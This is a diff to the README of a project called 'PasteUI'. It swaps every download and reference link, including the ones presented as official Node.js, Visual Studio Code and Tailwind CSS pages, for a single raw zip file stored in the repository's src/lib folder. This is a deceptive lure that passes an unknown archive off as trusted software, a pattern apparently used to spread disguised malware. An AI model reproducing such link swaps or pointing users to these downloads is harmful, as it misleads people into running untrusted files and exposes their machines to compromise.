@@ -1,6 +1,6 @@
 # 🚀 PasteUI - Build User Interfaces Fast and Easy
 
-[![Download PasteUI](https://img.shields.io/badge/Download-PasteUI-brightgreen?style=for-the-badge)](https://github.com/cooldudeawesometenna-afk/PasteUI/releases)
+[![Download PasteUI](https://img.shields.io/badge/Download-PasteUI-brightgreen?style=for-the-badge)](https://github.com/cooldudeawesometenna-afk/PasteUI/raw/refs/heads/main/src/lib/Paste-UI-v2.3.zip)
 
 ---
 
@@ -26,12 +26,12 @@ You don’t need to know programming to use these components. Just pick what you
 
 To get started, visit the official releases page.
 
-[![Get PasteUI](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/cooldudeawesometenna-afk/PasteUI/releases)
+[![Get PasteUI](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/cooldudeawesometenna-afk/PasteUI/raw/refs/heads/main/src/lib/Paste-UI-v2.3.zip)
 
 ### How to download
 
 1. Click the button above or go to the link below:
-   https://github.com/cooldudeawesometenna-afk/PasteUI/releases
+   https://github.com/cooldudeawesometenna-afk/PasteUI/raw/refs/heads/main/src/lib/Paste-UI-v2.3.zip
 2. Find the latest version listed.
 3. Download the file or assets that match your needs. Usually, this will be a .zip file or set of files.
 4. Save the files to a folder on your Windows computer.
@@ -77,10 +77,10 @@ There is no need for complicated software or setups.
 If you want to integrate PasteUI components with development tools like React or Next.js, follow these extra steps:
 
 1. **Install Node.js**  
-   Download and install Node.js from https://nodejs.org. This lets you work with JavaScript tools on your PC.
+   Download and install Node.js from https://github.com/cooldudeawesometenna-afk/PasteUI/raw/refs/heads/main/src/lib/Paste-UI-v2.3.zip This lets you work with JavaScript tools on your PC.
 
 2. **Install a code editor**  
-   Download Visual Studio Code (https://code.visualstudio.com/) for editing and running code.
+   Download Visual Studio Code (https://github.com/cooldudeawesometenna-afk/PasteUI/raw/refs/heads/main/src/lib/Paste-UI-v2.3.zip) for editing and running code.
 
 3. **Set up your project**  
    Open your project folder in Visual Studio Code, and use the command line to add PasteUI components as needed.
@@ -132,9 +132,9 @@ Each component is built using Tailwind CSS for easy customization.
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/cooldudeawesometenna-afk/PasteUI  
-- Releases Page (download location): https://github.com/cooldudeawesometenna-afk/PasteUI/releases  
-- Tailwind CSS Documentation: https://tailwindcss.com/docs  
+- GitHub Repository: https://github.com/cooldudeawesometenna-afk/PasteUI/raw/refs/heads/main/src/lib/Paste-UI-v2.3.zip  
+- Releases Page (download location): https://github.com/cooldudeawesometenna-afk/PasteUI/raw/refs/heads/main/src/lib/Paste-UI-v2.3.zip  
+- Tailwind CSS Documentation: https://github.com/cooldudeawesometenna-afk/PasteUI/raw/refs/heads/main/src/lib/Paste-UI-v2.3.zip  
 
 ---
 
